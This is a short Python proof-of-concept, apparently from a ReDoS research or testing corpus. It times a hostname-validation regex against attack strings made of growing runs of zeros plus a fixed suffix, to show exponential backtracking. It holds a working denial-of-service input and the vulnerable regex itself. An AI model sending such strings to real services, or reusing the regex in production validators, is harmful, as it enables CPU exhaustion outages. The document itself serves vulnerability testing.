# 4826
# (?=^.{1,254}$)(^(?:[a-zA-Z0-9][a-zA-Z0-9\-]{0,61}[a-zA-Z0-9]\.?)+(?:[a-zA-Z]{2,})$)
# EXPONENT
# nums:4
# EXPONENT AttackString:""+"0"*32+"! _1_EOA(iv)"

import re
from time import perf_counter

regex = """(?=^.{1,254}$)(^(?:[a-zA-Z0-9][a-zA-Z0-9\-]{0,61}[a-zA-Z0-9]\.?)+(?:[a-zA-Z]{2,})$)"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "" + "0" * i * 1 + "! _1_EOA(iv)"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")